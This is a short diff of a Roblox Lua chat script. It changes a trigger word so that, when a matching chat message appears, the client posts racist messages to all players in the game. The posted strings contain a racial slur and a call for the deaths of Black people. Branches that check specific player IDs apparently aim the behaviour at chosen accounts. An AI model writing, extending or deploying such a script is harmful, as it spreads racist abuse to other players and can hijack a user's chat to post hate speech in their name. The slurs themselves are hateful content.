@@ -17,7 +17,7 @@ elseif playerId == 7801483850 then
 else
 
 local function onChatMessage(message, speaker)
-    if message == "Ax1" then
+    if message == "darth" then
         game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("I Hate Niggers So Fucking Much", "All")
     elseif message == "Ax2" then
         game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("I WISH ALL BLACK MONKEY NIGGERS DIE", "All")
